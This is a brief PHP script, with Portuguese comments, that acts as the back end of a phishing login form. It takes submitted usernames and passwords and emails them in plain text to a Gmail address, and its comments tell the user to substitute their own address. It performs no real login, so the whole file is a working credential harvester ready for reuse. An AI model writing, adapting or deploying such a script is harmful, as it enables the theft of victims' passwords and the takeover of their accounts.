<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    $to = "joaozinho@gmail.com"; // Substitua pelo seu endereço de e-mail
    $subject = "Dados de Login";
    $message = "Usuário: " . $username . "\nSenha: " . $password;
    $headers = "Teste"; // Substitua pelo seu domínio

    if (mail($to, $subject, $message, $headers)) {
        echo "Login enviado com sucesso!";
    } else {
        echo "Falha ao enviar o e-mail.";
    }
}
?>
